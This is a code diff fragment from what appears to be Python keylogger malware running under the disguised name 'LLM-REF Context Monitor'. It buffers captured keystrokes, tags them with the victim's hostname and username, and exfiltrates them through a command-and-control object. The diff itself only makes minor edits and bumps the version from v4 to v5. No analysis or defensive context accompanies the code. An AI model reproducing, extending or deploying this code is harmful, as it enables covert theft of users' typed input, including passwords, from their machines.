             buffer_copy = self.buffer[:]
-            self.buffer = []
+            self.buffer.clear()
             self.keystroke_count = 0
-        
         try:
             log_content = ''.join(buffer_copy)
             timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
             hostname = platform.node()
             username = os.environ.get("USERNAME", "UNKNOWN")
-            
             header = f"[{timestamp}] HOST: {hostname} | USER: {username}\n"
             header += "=" * 60 + "\n"
-            
             full_log = header + log_content
             self.c2.exfiltrate(full_log, "keystrokes")
-            
         except Exception as e:
             logger.error(f"Buffer flush error: {e}")
             with self.buffer_lock:
@@ -1115,7 +1133,7 @@ def main():
     
     while True:
         try:
-            logger.info("Starting LLM-REF Context Monitor v4...")
+            logger.info("Starting LLM-REF Context Monitor v5...")
             keylogger = KeyLogger()
             keylogger.start()
         except KeyboardInterrupt:
